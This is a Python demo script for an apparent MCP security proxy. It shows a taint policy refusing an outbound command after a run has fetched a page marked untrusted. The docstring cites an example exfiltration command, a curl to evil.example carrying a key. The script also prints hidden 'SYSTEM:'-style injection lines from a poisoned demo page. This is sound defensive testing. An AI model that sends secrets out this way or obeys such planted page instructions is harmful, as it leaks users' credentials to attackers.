"""Taint demo — a run that read an untrusted page is refused when it sends.

Three real processes, one real stdio wire each, exactly as in ``run_demo.py``:

    MCP client  ->  python -m proxy  ->  proxy/demo/upstream_server.py

against the committed ``policy/policy.example.yaml``, unmodified. Nothing here
is a fixture built to make taint look good: ``egress_mode`` is the shipped
``secrets_only``.

It makes the SAME call three times and changes exactly one thing about the run
it is made in:

    1. clean run, through the proxy   -> allowed, and it reaches the tool
    2. after fetching a page,   ditto -> REFUSED, and it does not
    3. the same pair with no proxy    -> both reach the tool

Leg 1 is not decoration. A refusal on its own proves nothing — the call might
simply be one this policy never permitted. Leg 1 is that call permitted, by the
shipped rules, in the same session shape, so leg 2's refusal has exactly one
cause: the run consumed a result from a tool ``taint.sources`` names.

WHY ``echo <key>`` AND NOT ``curl https://evil.example/?k=<key>``. The curl
spelling is refused in a CLEAN run too — no spelling of curl matches any
``shell-readonly`` pattern, so it falls to deny-by-default — and a call that was
already blocked can demonstrate nothing about taint. The call below is one the
committed policy genuinely ALLOWS.

WHAT THIS DOES NOT SHOW, stated here because ``docs/THREAT-MODEL.md`` §4 makes
it a condition of the demo existing: no model is in the loop. The client is
scripted; it issues call 2 because this file says so, not because anything read
the page and decided to obey. Nothing inspects the page's content — not the
proxy, which forwards the upstream's bytes untouched, and not the engine, which
marks the run on the SOURCE tool. The claim is "this run read something the
operator called untrusted, and the gateway then refused what it tried to send",
never "an injection was stopped end to end".

Ground truth for "did it land" is the upstream's own ``EXECUTED.log`` — a line
appears there exactly when a call reaches the tool.

    python proxy/demo/tainted_run.py                 # human-readable transcript
    python proxy/demo/tainted_run.py --out FILE      # also write it to FILE
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import tempfile
import textwrap
from pathlib import Path

import anyio
import yaml

from mcp import Client, MCPError, StdioServerParameters, stdio_client

REPO_ROOT = Path(__file__).resolve().parents[2]
POLICY_PATH = REPO_ROOT / "policy" / "policy.example.yaml"
UPSTREAM = REPO_ROOT / "proxy" / "demo" / "upstream_server.py"
PAGE = REPO_ROOT / "proxy" / "demo" / "poisoned-page.txt"

# docs.python.org is on `net-fetch-allowlist` AND on `taint.allowed_domains`, so
# this fetch is ordinary permitted work under every one of the three modes. It is
# also in `taint.sources`, which is what marks the run.
SOURCE_TOOL, SOURCE_ARGS = "fetch_url", {"url": "https://docs.python.org/3/library/json.html"}

# Well-formed AWS access key id, fake — the same convention the suite uses. The
# command is spelled exactly like `shell-readonly`'s third anchored pattern, so
# it is a genuine allow in the committed policy file.
AKIA = "AKIA" + "A" * 16
EGRESS_TOOL, EGRESS_ARGS = "run_command", {"command": f"echo {AKIA}"}

lines: list[str] = []


def say(text: str = "") -> None:
    lines.append(text)
    print(text, flush=True)


def child_env() -> dict[str, str]:
    """A stdio child does not inherit the parent environment (the SDK passes an
    allow-list). The proxy and upstream both need to find this project."""
    env = {k: os.environ[k] for k in ("HOME", "PATH", "LOGNAME", "SHELL", "TERM", "USER") if k in os.environ}
    env["PYTHONPATH"] = str(REPO_ROOT)
    return env


def executed(sandbox: Path) -> list[str]:
    log = sandbox / "EXECUTED.log"
    return log.read_text(encoding="utf-8").splitlines() if log.is_file() else []


def upstream_argv(sandbox: Path) -> list[str]:
    return [sys.executable, str(UPSTREAM), "--sandbox", str(sandbox), "--page", str(PAGE)]


def proxied_params(sandbox: Path, log_file: Path) -> StdioServerParameters:
    return StdioServerParameters(
        command=sys.executable,
        args=[
            "-m", "proxy",
            "--policy", str(POLICY_PATH),
            "--agent-id", "demo-agent",
            "--log-file", str(log_file),
            "--", *upstream_argv(sandbox),
        ],
        cwd=str(REPO_ROOT),
        env=child_env(),
    )


def direct_params(sandbox: Path) -> StdioServerParameters:
    argv = upstream_argv(sandbox)
    return StdioServerParameters(command=argv[0], args=argv[1:], cwd=str(REPO_ROOT), env=child_env())


async def one_call(client: Client, tool: str, args: dict) -> str:
    """The gateway's own answer, verbatim — only the line breaks are ours.

    The refusal message is the most informative line the demo prints and it runs
    past 190 characters, so it is wrapped with a hanging indent rather than
    truncated: a reader in an 80-column terminal sees all of it, and the bytes
    are the ones the proxy sent.
    """
    try:
        result = await client.call_tool(tool, args)
        return "RESULT   " + result.content[0].text.replace("\n", " ")[:96]
    except MCPError as exc:
        refusal = f"REFUSED  code={exc.error.code} {exc.error.message}"
        return "\n    ".join(textwrap.wrap(refusal, width=104, subsequent_indent="         "))


def show_reached(sandbox: Path) -> None:
    reached = executed(sandbox)
    say(f"  upstream EXECUTED.log ({len(reached)} line(s)) — what actually reached the tool:")
    for line in reached:
        say(f"    | {line}")
    if not reached:
        say("    | <empty>")
    say()


async def clean_run(sandbox: Path, log_file: Path) -> None:
    say("--- 1. CLEAN RUN through the proxy — the control " + "-" * 21)
    say("  nothing has been consumed yet; the run is not marked")
    async with Client(stdio_client(proxied_params(sandbox, log_file))) as client:
        say(f"  SEND    {EGRESS_TOOL} {EGRESS_ARGS}")
        say("    " + await one_call(client, EGRESS_TOOL, EGRESS_ARGS))
    show_reached(sandbox)


async def tainted_run(sandbox: Path, log_file: Path) -> None:
    say("--- 2. THE SAME CALL, after reading a page " + "-" * 27)
    async with Client(stdio_client(proxied_params(sandbox, log_file))) as client:
        say(f"  FETCH   {SOURCE_TOOL} {SOURCE_ARGS}")
        say("    " + await one_call(client, SOURCE_TOOL, SOURCE_ARGS))
        say("    the page carries this, verbatim, in an HTML comment the user never sees:")
        for line in PAGE.read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            if stripped.startswith(("SYSTEM:", "1.", "2.", "Session continuation", "Resume the user")):
                say(f"      > {stripped}")
        say("    the run is now MARKED: it has consumed a result from a tool that")
        say("    policy/policy.example.yaml lists under `taint.sources`. Nothing read")
        say("    the page — the mark is on the source tool, not on the content.")
        say()
        say(f"  SEND    {EGRESS_TOOL} {EGRESS_ARGS}    <- byte-identical to leg 1")
        say("    " + await one_call(client, EGRESS_TOOL, EGRESS_ARGS))
    show_reached(sandbox)


async def unproxied_run(sandbox: Path) -> None:
    say("--- 3. NO PROXY (guard off — the second control) " + "-" * 21)
    async with Client(stdio_client(direct_params(sandbox))) as client:
        say(f"  FETCH   {SOURCE_TOOL} {SOURCE_ARGS}")
        say("    " + await one_call(client, SOURCE_TOOL, SOURCE_ARGS))
        say(f"  SEND    {EGRESS_TOOL} {EGRESS_ARGS}")
        say("    " + await one_call(client, EGRESS_TOOL, EGRESS_ARGS))
    show_reached(sandbox)


def rule_of(log_file: Path, tool: str) -> str | None:
    """The rule id the proxy recorded for the LAST tools/call on `tool`.

    Read out of the emitted events rather than out of the printed error text:
    the event is the artifact a SOC receives, and B-046 is what happens when a
    demo assumes which `taint:` id it will get instead of reading the one the
    gateway wrote.
    """
    if not log_file.is_file():
        return None
    ids = [
        event.get("rule_id")
        for event in (json.loads(line) for line in log_file.read_text(encoding="utf-8").splitlines())
        if event.get("method") == "tools/call" and event.get("tool") == tool
    ]
    return ids[-1] if ids else None


async def main_async(out: Path | None) -> None:
    with tempfile.TemporaryDirectory(prefix="chokepoint-taint-") as tmp:
        clean, tainted, unguarded = (Path(tmp) / name for name in ("clean", "tainted", "unguarded"))
        for box in (clean, tainted, unguarded):
            box.mkdir()
        clean_log, tainted_log = Path(tmp) / "clean.jsonl", Path(tmp) / "tainted.jsonl"

        # Read, not asserted: the gate legs run this demo against mutated
        # policies, and a hardcoded "unmodified, shipped mode" parenthetical is
        # false in exactly the runs where the reader most needs to know better.
        mode = yaml.safe_load(POLICY_PATH.read_text(encoding="utf-8")).get("taint", {}).get("egress_mode")
        say("Agent-Chokepoint — taint demo: read a page, then try to send")
        say(f"policy: {POLICY_PATH.relative_to(REPO_ROOT)}   taint.egress_mode: {mode}")
        say(f"page:   {PAGE.relative_to(REPO_ROOT)}")
        say(f"python: {sys.version.split()[0]}")
        say("NOTE: the upstream RECORDS run_command instead of executing it, and ANSWERS")
        say("      fetch_url from the file named above. Nothing here touches the network,")
        say("      and the proof of reach is its EXECUTED.log, not a real shell.")
        say()

        await clean_run(clean, clean_log)
        await tainted_run(tainted, tainted_log)
        await unproxied_run(unguarded)

        clean_rule = rule_of(clean_log, EGRESS_TOOL)
        tainted_rule = rule_of(tainted_log, EGRESS_TOOL)
        say("--- what the gateway recorded " + "-" * 39)
        say(f"  leg 1  {EGRESS_TOOL} -> rule {clean_rule}")
        say(f"  leg 2  {EGRESS_TOOL} -> rule {tainted_rule}")
        say()

        sent = [line for line in executed(tainted) if line.startswith(EGRESS_TOOL)]
        # Each label is a DISTINCT word, because the gate test keys its
        # assertions on them and two checks both called "control" silently
        # collapsed into one — the second overwriting the first, so a broken
        # clean control still read PASS. Found by the mutation leg that removes
        # `shell-readonly`; it is B-017's shape in the gate that was written to
        # prevent B-017's shape.
        checks = [
            ("enforcement:       the send did NOT reach the tool after the page",
             not sent),
            ("control-clean:     the identical send DID reach the tool in a clean run",
             bool([line for line in executed(clean) if line.startswith(EGRESS_TOOL)])),
            ("availability:      the page fetch itself was allowed and reached the tool",
             bool([line for line in executed(tainted) if line.startswith(SOURCE_TOOL)])),
            ("control-unguarded: with no proxy in the path, the same send landed",
             bool([line for line in executed(unguarded) if line.startswith(EGRESS_TOOL)])),
            ("attribution:       the same call, allowed then refused, and taint is why",
             clean_rule == "shell-readonly" and (tainted_rule or "").startswith("taint:")),
        ]
        say("--- verdict " + "-" * 57)
        for label, passed in checks:
            say(f"  [{'PASS' if passed else 'FAIL'}] {label}")
        ok = all(passed for _label, passed in checks)
        say(f"  {'PASS' if ok else 'FAIL'} — one variable: whether the run had read the page.")
        say()
        say("  What this shows: a call of this shape is refused after this run consumed")
        say("  an untrusted result, and the identical call is allowed without it.")
        say("  What it does NOT show: an injection stopped end to end. No model is in")
        say("  the loop — leg 2's send is scripted, not obeyed. docs/THREAT-MODEL.md §4.")

    if out is not None:
        out.write_text("\n".join(lines) + "\n", encoding="utf-8")
        print(f"\n[transcript written to {out}]", flush=True)
    if not ok:
        sys.exit(1)


def main() -> None:
    parser = argparse.ArgumentParser(description="Taint demo (real processes, real stdio).")
    parser.add_argument("--out", type=Path, default=None, help="also write the transcript here")
    args = parser.parse_args()
    anyio.run(main_async, args.out)


if __name__ == "__main__":
    main()
